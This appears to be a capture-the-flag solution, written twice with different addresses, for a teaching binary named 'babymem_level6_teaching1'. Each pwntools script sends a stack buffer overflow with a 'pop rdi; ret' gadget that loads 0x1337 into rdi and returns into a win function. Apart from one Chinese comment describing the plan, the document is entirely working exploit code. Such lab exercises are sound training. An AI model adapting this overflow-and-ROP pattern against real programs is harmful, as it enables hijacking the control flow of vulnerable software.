# 先设置rdi为目标值, 再调用win(int t)函数
# 用pop rdi; ret;来实现

from pwn import *

pro_name = "./babymem_level6_teaching1"
io = process(pro_name)
io.recvuntil(b"size: ")
pop_rdi = 0x401d73
win = 0x4015e2
payload = b'A'*13*8+p64(pop_rdi)+p64(0x1337)+p64(win)
io.sendline(b'128')
io.sendline(payload)
io.interactive()




from pwn import *

pro_name = "./babymem_level6_teaching1"
io = process(pro_name)
io.recvuntil(b"size: ")
pop_rdi = 0x402403
win = 0x402120
payload = b'A'*(0x70+8)+p64(pop_rdi)+p64(0x1337)+p64(win)
io.sendline(b'128')
io.sendline(payload)
io.interactive()
